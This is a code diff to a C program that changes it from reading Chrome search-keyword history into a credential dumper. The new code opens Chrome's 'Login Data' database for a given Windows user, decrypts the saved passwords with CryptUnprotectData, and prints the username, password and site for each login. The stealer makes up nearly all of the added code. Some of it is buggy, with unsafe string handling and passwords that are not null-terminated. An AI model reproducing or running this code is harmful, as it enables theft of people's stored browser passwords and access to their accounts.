@@ -9,17 +9,97 @@
 #include <stdlib.h>
 #include "../deps/sqlite3.h"
 #include <string.h>
+#include <windef.h>
+#include <winsock2.h>
+#include "winbase.h"
+#include "wincrypt.h"
 
-#ifdef _WIN32
-#define OS "Windows"
+#define QUERY "SELECT password_value, username_value, origin_url FROM logins"
 #define PATH1 "C:\\Users\\"
-#define PATH2 "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\history"
-#define PATH1XP " C:\\Documents and Settings\\"
-#define PATH2XP "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default"
-#define QUERY "SELECT lower_term, term FROM keyword_search_terms"
-#elif __APPLE__
-#elif __linux
-#endif
+#define PATH2 "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+
+void getPath(char* str, const char* user, const char* part1, const char* part2);
+void printData(sqlite3_stmt* stmHandle);
+void setPath(char* path);
+void wQuit();
+void cutPage(char* str, const char* value);
+
+int main(int argc, char** argv) {
+
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+
+    char googleChrome[255];
+    setPath(googleChrome);
+
+    sqlite3 *db;
+    sqlite3_stmt *stmt;
+    int res = 0;
+
+    res = sqlite3_open(googleChrome, &db);
+    if (res != SQLITE_OK) {
+        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
+        return 1;
+    }
+
+    res = sqlite3_prepare(db, QUERY, strlen(QUERY) + 1, &stmt, NULL);
+    if (res != SQLITE_OK) {
+        fprintf(stderr, "Couldn't execute query: %s\n", sqlite3_errmsg(db));
+        return 1;
+    }
+
+    int hasRow;
+    do {
+        hasRow = sqlite3_step(stmt);
+
+        if (hasRow == SQLITE_ROW) {
+            printData(stmt);
+        }
+
+    } while (hasRow == SQLITE_ROW);
+    sqlite3_close(db);
+
+    wQuit();
+
+    return (EXIT_SUCCESS);
+}
+
+void wQuit() {
+    printf("\nPress <enter> to Quit.\n");
+    int ch;
+    while ((ch = getchar()) != '\n');
+    getchar();
+}
+
+void setPath(char* path) {
+    char name[255];
+
+    printf("Insert user name: ");
+    scanf("%s", name);
+
+    getPath(path, name, PATH1, PATH2);
+}
+
+void printData(sqlite3_stmt* stmHandle) {
+
+    char page[255];
+    char username[255];
+    DATA_BLOB pass;
+    DATA_BLOB blob;
+
+    blob.cbData = sqlite3_column_bytes(stmHandle, 0);
+    blob.pbData = (BYTE*) sqlite3_column_blob(stmHandle, 0);
+    CryptUnprotectData(&blob, NULL, NULL, NULL, NULL, 0, &pass);
+
+    char passStr[pass.cbData];
+    memcpy(passStr, pass.pbData, pass.cbData);
+
+    cutPage(page, (char *) sqlite3_column_text(stmHandle, 2));
+    strcpy(username, (char *) sqlite3_column_text(stmHandle, 1));
+    
+    printf("%s;%s;%s \n", username, passStr, page);
+
+}
 
 void getPath(char* str, const char* user, const char* part1, const char* part2) {
     strcpy(str, part1);
@@ -27,53 +107,13 @@ void getPath(char* str, const char* user, const char* part1, const char* part2) 
     strcat(str, part2);
 }
 
-int main(int argc, char** argv) {
-
-    setvbuf(stdout, NULL, _IONBF, 0);
-
-    sqlite3 *db;
-    sqlite3_stmt *stmHandle;
-    char nome[255];
-    char googleChrome[255];
-    char lowerterm[255];
-    char term[255];
-    int len = strlen(QUERY) + 1;
-    int hasRow;
-
-    printf("Insert user name: ");
-    scanf("%s", nome);
-
-    getPath(googleChrome, nome, PATH1, PATH2);
-
-    if (sqlite3_open(googleChrome, &db) != SQLITE_OK) {
-        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
-        exit(0);
+void cutPage(char* str, const char* value) {
+    int slashs = 0, i = 0;
+    memset(str, '\0', sizeof(str) * strlen(str));
+    str[strlen(value)];
+    for (i = 0; i < strlen(value); i++) {
+        if(slashs > 2) break;
+        if(value[i] == '/') slashs++;
+        str[i] = value[i];
     }
-
-    if (sqlite3_prepare(db, QUERY, len, &stmHandle, NULL) != SQLITE_OK) {
-        fprintf(stderr, "Couldn't execute query: %s\n", sqlite3_errmsg(db));
-        sqlite3_close(db);
-        exit(0);
-    }
-    
-    do {
-        hasRow = sqlite3_step(stmHandle);
-
-        if (hasRow == SQLITE_ROW) {
-            strcpy(lowerterm, (char *) sqlite3_column_text(stmHandle, 0));
-            strcpy(term, (char *) sqlite3_column_text(stmHandle, 1));
-        }
-
-        printf("Lower Termo: %s -::- Termo: %s \n", lowerterm, term);
-
-    } while (hasRow == SQLITE_ROW);
-    sqlite3_close(db);
-
-    printf("Prima <enter> para sair.\n");
-    int ch;
-    while ((ch = getchar()) != '\n');
-    getchar();
-
-    return (EXIT_SUCCESS);
 }
-
